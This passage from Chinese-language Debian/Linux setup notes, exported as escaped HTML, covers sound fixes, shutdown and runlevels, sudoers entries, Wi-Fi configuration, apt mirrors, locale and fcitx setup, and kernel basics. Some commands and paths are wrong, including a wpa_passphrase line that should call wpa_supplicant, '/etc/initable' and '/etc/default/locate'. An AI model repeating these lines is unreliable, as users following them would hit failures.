&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_DESKTOP_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Desktop&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_DOWNLOAD_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Download&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_TEMPLATES_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Template&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_PUBLICSHARE_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Public&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_DOCUMENTS_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Document&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_MUSIC_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Music&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_PICTURES_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Picture&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;XDG_VIDEOS_DIR&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;$HOME/Video&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
方法2
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ export LANG=en_US
xdg-user-dirs-gtk-update

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;电脑没有声音问题解决&lt;/b&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装驱动软件
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install alsa-utils
$ sudo apt-get install alsa-oos
$ sudo apt-get install esound
$ sudo apt-get install gnome-audio

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
检查声卡驱动
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ lspci |grep Audio

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
检查内核模块
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ lsmod |grep snd

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
检查系统音量
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ alsamixer

&lt;/pre&gt;
&lt;p&gt;
alsamixer 是 alsa 驱动的一个插件,是一个命令行下的图形设置工具。alsamixer 命令，00 表示音量正常，MM表示此声道静音。可以通过M键切换。
&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
初始化声卡
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo alsactl init

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;参考资料
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.gtwang.org/linux/ubuntu-16-04-headphone-speakers-sound-problem/&quot;&gt;解決 Ubuntu Linux 16.04 耳機輸出沒有聲音的問題&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;&lt;b&gt;关机和重启命令&lt;/b&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
shutdown
&lt;br /&gt;
关机、重启计算机(Halt, power-off or reboot the machine)
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo shutdown -r now
// 其他重启命令
$ sudo reboot
$ sudo init 6

&lt;/pre&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 1:&lt;/span&gt; 系统运行级别&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-right&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-right&quot;&gt;级别&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;0&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;关机，不允许设置为初始化默认值&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;1&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;单用户模式&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;不完全多用户，不含NFS服务&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;3&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;完全多用户&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;4&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;未分配&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;5&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;图形界面&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-right&quot;&gt;6&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;重启，不允许设置为初始化默认值&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre class=&quot;example&quot;&gt;
$ cat /etc/initable
// 查看系统运行级别
$ sudo runlevel

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
其他关机/注销命令
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
halt
poweroff
init 0
logout

&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org68fb21c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org68fb21c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 配置(Configuration)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5995a54&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org5995a54&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.1&lt;/span&gt; 用户身份切换: su &amp;amp; sudo&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-1&quot;&gt;
&lt;p&gt;
Linux 系统当中的身份变换，可能有以下几个原因：
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;使用一般账号：系统平日操作的好习惯&lt;/li&gt;
&lt;li&gt;用较低权限启动系统服务&lt;/li&gt;
&lt;li&gt;软件本身的限制&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;
su 是最简单的身份切换命令。
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;-：单纯使用 - 如『 su - 』代表使用 login-shell 的变量文件读取方式来登陆系统；若使用者名称没有加上去，则代表切换为 root 的身份。&lt;/li&gt;
&lt;li&gt;-l：与 - 类似，但后面需要加欲切换的使用者账号！也是 login-shell 的方式。&lt;/li&gt;
&lt;li&gt;-m：-m 与 -p 是一样的，表示『使用目前的环境配置，而不读取新使用者的配置文件』&lt;/li&gt;
&lt;li&gt;-c：仅进行一次命令，所以 -c 后面可以加上命令喔！&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;
并非所有人都能够运行 sudo，而是仅有规范到 /etc/sudoers 内的用户才能够运行 sudo 这个命令。同时， /etc/sudoers 可以修改默认的 timeout。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orge0376e6&quot;&gt;Defaults        env_reset
Defaults        &lt;span style=&quot;color: #FF8C00;&quot;&gt;timestamp_timeout&lt;/span&gt;=60
...
root    &lt;span style=&quot;color: #FF8C00;&quot;&gt;ALL&lt;/span&gt;=(ALL:ALL) ALL
zrg     &lt;span style=&quot;color: #FF8C00;&quot;&gt;ALL&lt;/span&gt;=(ALL:ALL) ALL
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#25351;&amp;#23450;&amp;#29992;&amp;#25143;&amp;#19981;&amp;#29992;&amp;#36755;&amp;#20837;&amp;#23494;&amp;#30721;&lt;/span&gt;
zrg     &lt;span style=&quot;color: #FF8C00;&quot;&gt;ALL&lt;/span&gt;=(ALL:ALL)NOPASSWD: ALL
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#25480;&amp;#26435; zrg_test &amp;#29992;&amp;#25143;&amp;#25191;&amp;#34892;&amp;#37325;&amp;#21551;&amp;#21629;&amp;#20196;&lt;/span&gt;
zrg_test &lt;span style=&quot;color: #FF8C00;&quot;&gt;ALL&lt;/span&gt;=/sbin/shutdown -r now
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;Allow members of group sudo to execute any command&lt;/span&gt;
%sudo   &lt;span style=&quot;color: #FF8C00;&quot;&gt;ALL&lt;/span&gt;=(ALL:ALL) ALL
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org88efccc&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org88efccc&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.2&lt;/span&gt; Wifi连接配置(configure)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-2&quot;&gt;
&lt;p&gt;
完成安装第一步，当然是先解决网络。
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
查看无线（wireless）网卡（LAN）驱动（driver）
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo lsmod | grep iw

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
安装（Installing）无线网卡驱动
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install firmware-iwlwifi wireless-tools

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
向内核（kernel）中加载/移除模块（modules）
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$  modprobe iwl4965

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
重启系统
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ reboot

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
配置无线网络
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
//查看无线网口（nerwork port）
$ sudo iwconfig
//开启无线网口
$ sudo ifconfig wlan0 up
//扫描（scaning）无线网络
$ sudo iwlist wlan0 scan
//连接无线网络
$ sudo iwconfig wlan0 ESSID &quot;wifi-name&quot; KEY &quot;password&quot; open
//执行上面的命令（command）后，发现并不能成功！！！
//于是，通过如下命令继续配置
//格式：wpa_passphrase &amp;lt;ssid&amp;gt; [passphrase]
$ sudo wpa_passphrase &quot;wifi-name&quot; &quot;passowrd&quot;&amp;gt;/etc/wpa_supplicant.conf
$ sudo wpa_passphrase -B -i wlan0 -Dwext -c /etc/wpa_supplicant.conf
//查看wlan0无线网口
$ sudo iwconfig wlan0
//执行命令获取到IP地址，成功连上WiFi
$ sudo dhclient wlan0

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
开机自动连接WiFi配置
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/network/interfaces.d/wlan0

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;auto wlan0
allow-hotplug wlan0
iface wlan0 inet dhcp
 wpa-conf /etc/wpa_supplicant.conf 
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgbb72d44&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgbb72d44&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.3&lt;/span&gt; 配置安装源(source)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
以配置163源举例说明
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;访问域名:mirrors.163.com，找到镜像名为debian的目录，点击debian使用帮助。&lt;/li&gt;
&lt;li&gt;根据最新的debian版本进行选择jessie，wheezy，squeeze。从最新版本到最低版本选择源&lt;/li&gt;
&lt;li&gt;复制安装源文本到 /etc/apt/source.list 中。&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgd3dc4d4&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;mirrors.163.com&lt;/span&gt;
deb http://mirrors.163.com/debian/ jessie main non-free contrib
deb http://mirrors.163.com/debian/ jessie-updates main non-free contrib
deb http://mirrors.163.com/debian/ jessie-backports main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie-updates main non-free contrib
deb-src http://mirrors.163.com/debian/ jessie-backports main non-free contrib
deb http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
deb-src http://mirrors.163.com/debian-security/ jessie/updates main non-free contrib
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;其他安装源
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://mirrors.ustc.edu.cn/&quot;&gt;中国科学技术大学开源软件镜像站&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mirrors.tuna.tsinghua.edu.cn/&quot;&gt;清华大学开源软件镜像站&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://mirror.hust.edu.cn/&quot;&gt;华中科技大学开源镜像站&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mirrors.aliyun.com&quot;&gt;阿里云开源镜像站&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org475efa1&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org475efa1&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.2.4&lt;/span&gt; 配置系统支持中文(support chinese)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-2-4&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;安装及配置
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
查看并设置环境变量
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ echo $LANG
$ export LANG=en_US.UTF-8

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
没有安装 locales,先安装 locales
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo aptitude install locales

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
配置中文编码
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo dpkg-reconfigure locales
//选择编码（encode），space选择
en_US.UTF-8
zh_CN.GB2312
zh_CN.GB18030
zh_CN.GBK
zh_CN.UTF-8

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
文件配置
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo vim /etc/default/locate

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;LANG=&quot;zh_CN.UTF-8&quot;&lt;/span&gt;
&lt;span style=&quot;color: #8B8878;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;LANGUAGE=&quot;zh_CN:zh&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;LANG&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;en_US.UTF-8&quot;&lt;/span&gt;
&lt;span style=&quot;color: #FF8C00;&quot;&gt;LANGUAGE&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;en_US:en&quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;li&gt;安装中文输入法
ibus &amp;amp; UIM &amp;amp; SCIM &amp;amp; Fcitx
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.debian.org/gnome-chinese-input&quot;&gt;gnome-chinese-input&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.debian.org/I18n/ibus&quot;&gt;i18n ibus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Fcitx 输入法补充
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://blog.csdn.net/qq_21397217/article/details/52447263&quot;&gt;Ubuntu安装Fcitx以及Fcitx输入中文不显示候选词框的解决办法&lt;/a&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;&lt;p&gt;
安装 fcitx 组件（module）
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt-get install fcitx-tools fcitx-config* fcitx-data fcitx-frontend* fcitx-libs fcitx-module* fcitx-ui* presage

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
安装 fcitx 输入法
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt install fcitx-pinyin
$ sudo apt install fcitx-googlepinyin
$ sudo apt install fcitx-table //五笔

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
设置并运行
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ export LANG=zh_CN.utf8
$ export LC_CTYPE=zh_CN.utf8
$ export LC_ALL=zh_CN.utf8
$ export XMODIFIERS=@im=fcitx
$ fcitx &amp;amp;

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
ui 动态库的支持:
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
$ sudo apt install fcitx-frontend-gtk2 fcitx-frontend-gtk3 fcitx-ui-classic

&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;重启可用&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;参考资料
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://wiki.debian.org/Locale&quot;&gt;Locale debian wiki&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2358219&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org2358219&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 介绍(Instroduction)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;p&gt;
首先，明确一点：GNU Not's Unix.
&lt;/p&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org40841dc&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org40841dc&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.1&lt;/span&gt; 入门第一步，理解 Linux&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-1&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;首先，以 Linux 的思维方式系统性思考问题。&lt;/li&gt;
&lt;li&gt;Linux 是一个面向文件的操作系统。所有的应用、管理是基于文件的。&lt;/li&gt;
&lt;li&gt;Linux 是一个以命令行为主要的管理方式的 OS。&lt;/li&gt;
&lt;li&gt;Linux 的日志非常完善，也至关重要。&lt;/li&gt;
&lt;li&gt;Linux 是一个以配置文件为管理基础的 OS。&lt;/li&gt;
&lt;li&gt;Linux 的所有应用、管理和配置，都有很多程序来辅助完成。&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0435a92&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org0435a92&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;2.3.2&lt;/span&gt; Linux 内容划分&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-2-3-2&quot;&gt;
&lt;p&gt;
Linux 可划分为以下四部分
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Linux 内核&lt;/li&gt;
&lt;li&gt;GNU 工具&lt;/li&gt;
&lt;li&gt;图形化桌面环境&lt;/li&gt;
&lt;li&gt;应用软件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
&lt;b&gt;深入探究 Linux 内核&lt;/b&gt;
&lt;br /&gt;
Linus Torvalds：Linux 内核开发者。
&lt;br /&gt;
Linux 内核主要负责一下四种功能：
&lt;br /&gt;
&lt;/p&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;系统内存管理
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;内核不仅管理服务器上的可用物理内存，还可以创建和管理虚拟内存。&lt;/li&gt;
&lt;li&gt;内核通过硬盘上的存储空间来实现虚拟内存，这块区域称为交换空间（swap space）。内核不断地交换空间和实际的物理内存之间反复交换虚拟内存中的内容。这使得系统以为它拥有比物理内存更多的可用内存。&lt;/li&gt;
&lt;li&gt;内存存储单元按组划分成很多块，这些块称作页面（page）。内核将每个内存页面放在物理内存或交换空间。然后，内核会维护一个内存页面表，指明哪些页面位于物理内存内，哪些页面被换到了磁盘上。&lt;/li&gt;
&lt;li&gt;内核会记录哪些内存页面正在使用中，并自动把一段时间未访问的内存页面复制到交换空间区域（称为换出，swapping out）——即使还有可用内存。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;软件程序管理
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;Linux 操作系统将运行中的程序称为进程。内核控制着 Linux 系统如何管理运行在系统上的所有进程。&lt;/li&gt;
&lt;li&gt;内核创建了第一个进程（称为 init 进程）来启动系统上所有其他进程。Linux 操作系统的 init 系统采用了运行级。Linux 操作系统有 5个启动运行级。
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;运行级为 1 时，只启动基本的系统进程以及一个控制台终端进程，我们称之为单用户模式。单用户模式通常用来在系统有问题时进行紧急的文件系统维护。显然，这种模式下，仅有一个人（通常是系统管理员）能登录到系统上操作数据。&lt;/li&gt;
&lt;li&gt;运行级为 3 时，大多数应用软件，比如网络支持程序，都会启动。&lt;/li&gt;
&lt;li&gt;运行级为 5 时，系统会启动 X Window 系统，允许用户通过图形化桌面窗口登录系统。&lt;/li&gt;
&lt;li&gt;Linux 系统可以通过调整启动运行级来控制整个系统的功能。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;硬件设备管理
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;p&gt;
内核的另一职责是管理硬件设备。任何 Linux 系统需要与之通信的设备，都需要在内核代码中加入驱动程序代码。在 Linux 内核中有两种方法用于插入设备驱动程序代码：
&lt;/p&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;编译进内核的设备驱动代码&lt;/li&gt;
&lt;li&gt;可插入内核的设备驱动模块&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;example&quot;&gt;
以前，插入设备驱动代码的唯一途径是重新编译内核。随着 Linux 内核支持的硬件设备越来越多，这个过程变得越来越低效。
后来，开发人员提出了内核模块的概念。它允许将驱动代码插入到运行中的内核而无需重新编译内核。Linux 系统将硬件设备当成特殊的文件，称为设备文件。

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;设备文件有3种分类
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;字符型设备文件：指处理数据时每次只能处理一个字符的设备。大多数类型的调制解调器和终端都是作为字符型设备文件创建的。&lt;/li&gt;
&lt;li&gt;块设备文件：指处理数据时每次能处理大块大数据的设备，比如硬盘。&lt;/li&gt;
&lt;li&gt;网络设备文件：指采用数据包发送和接受数据的设备，包括各种网卡和一个特殊的回环设备。这个回环设备允许 Linux 系统使用常见的网络编程协议同自身通讯。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Linux 为系统上的每个设备都创建一种称为节点的特殊文件。与设备的所有通信都通过设备节点完成。每个节点都有唯一的数值对供 Linux 内核标识它。数值对包括一个主设备号和一个次设备号。类似的设备被划分到同样的主设备号下。次设备号用于标识主设备组下的某个特定设备。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;
文件系统管理
Linux 内核支持通过不同类型的文件系统从硬盘中读写数据。内核必须在编译时就加入对所有可能用到的文件系统的支持。下表是 Linux 系统用来读写数据的标准文件系统
&lt;/p&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;
&lt;caption class=&quot;t-above&quot;&gt;&lt;span class=&quot;table-number&quot;&gt;Table 2:&lt;/span&gt; 文件系统类型&lt;/caption&gt;

&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;文件系统&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ext&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;Linux 扩展文件系统，最早的 Linux 文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ext2&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;第二扩展文件系统，在ext的基础上提供更多的功能&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ext3&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;第三扩展文件系统，支持日志功能&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;ext4&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;第四扩展文件系统，支持高级日志功能&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;hpfs&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;OS/2高性能文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;jfs&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;IBM日志文件系统&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;iso9660&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;ISO 9660文件系统（CD-ROM）&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;mimix&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;MINIX文件系统&lt;/td&gt;
&lt;/tr&gt;
